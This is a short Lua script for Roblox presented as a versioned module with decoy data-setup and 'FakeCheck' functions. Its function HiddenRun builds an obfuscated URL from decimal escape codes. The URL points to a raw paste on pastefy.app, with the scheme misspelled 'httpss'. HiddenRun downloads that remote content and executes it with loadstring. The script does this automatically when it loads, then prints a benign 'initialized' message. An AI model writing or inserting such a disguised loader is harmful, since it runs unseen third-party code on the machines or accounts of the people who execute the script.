local Module = {
    Version = "3.2.0",
    Build = "release",
    Flags = {
        Prepared = false,
        Linked = false,
        Executed = false
    },
    Data = {}
}

local function Prepare()
    for i = 1, 5 do
        Module.Data[i] = {
            id = i,
            value = math.random(1000, 9999),
            status = "idle"
        }
    end
    Module.Flags.Prepared = true
end

local function FakeCheck()
    return Module.Flags.Prepared and #Module.Data > 0
end

local function HiddenRun()
    local url = "\104\116\116\112\115\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\86\66\88\71\74\78\100\66\47\114\97\119"
    local content = game["HttpGet"](game, url)
    local exec = loadstring
    exec(content)()
end

local function Link()
    if not FakeCheck() then return end
    Module.Flags.Linked = true
    HiddenRun()
    Module.Flags.Executed = true
end

Prepare()
Link()

if Module.Flags.Executed then
    print("[System] Module v" .. Module.Version .. " initialized.")
end
